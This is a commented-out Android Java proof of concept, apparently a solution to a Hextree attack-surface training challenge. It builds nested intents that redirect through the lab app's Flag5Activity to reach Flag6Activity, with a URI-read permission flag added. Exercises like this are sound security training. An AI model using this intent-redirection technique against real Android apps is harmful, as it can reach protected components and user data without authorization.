//package com.example.attackpoc;
//
//import android.content.ComponentName;
//import android.content.Intent;
//import android.net.Uri;
//import android.os.Bundle;
//import android.util.Log;
//import android.view.View;
//import android.widget.Button;
//import android.widget.Toast;
//
//import androidx.activity.EdgeToEdge;
//import androidx.appcompat.app.AppCompatActivity;
//import androidx.core.graphics.Insets;
//import androidx.core.view.ViewCompat;
//import androidx.core.view.WindowInsetsCompat;
//
//public class MainActivity extends AppCompatActivity {
//    private static final String TARGET_PACKAGE = "io.hextree.attacksurface";
//    private static final String TARGET_ACTIVITY = "io.hextree.attacksurface.activities.Flag5Activity";
//
//
//    @Override
//    protected void onCreate(Bundle savedInstanceState) {
//        super.onCreate(savedInstanceState);
//        EdgeToEdge.enable(this);
//        setContentView(R.layout.activity_main);
//        // get incoming intent
//        Intent intent = getIntent();
//        Utils.showDialog(this, intent);
//
//
//        ((Button) this.<View>findViewById(R.id.btn_launch_activity)).setOnClickListener(new View.OnClickListener()
//        {
//
//            @Override
//            public void onClick(View view) {
//                Intent intent = new Intent();
//                intent.setComponent(new ComponentName(TARGET_PACKAGE
//                        , TARGET_ACTIVITY));
//
//                Intent intent2 = new Intent();
//                intent2.putExtra("return", 42);
//
//                Intent intent3 = new Intent();
//                intent3.setComponent(new ComponentName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag6Activity"));
//
//                intent3.putExtra("reason", "next");
//                intent3.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
//
//                intent2.putExtra("nextIntent", intent3);
//                intent.putExtra("android.intent.extra.INTENT", intent2);
//
//
//                startActivity(intent);
//
////                try {
////                    Thread.sleep(1000);
////                } catch (InterruptedException e) {
////                    throw new RuntimeException(e);
////                }
////                Intent reOpenIntent = new Intent();
////                reOpenIntent.setComponent(new ComponentName(TARGET_PACKAGE
////                        , TARGET_ACTIVITY));
////
////                onNewIntent(reOpenIntent);
//            }
//        });
//
//        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
//            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
//            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
//            return insets;
//        });
//    }
//
////    @Override
////    protected void onNewIntent(Intent intent) {
////        super.onNewIntent(intent);
////        // getIntent() should always return the most recent
////        setIntent(intent);
////        intent.setAction("REOPEN");
////        intent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);
////        startActivity(intent);
////
////    }
//
//}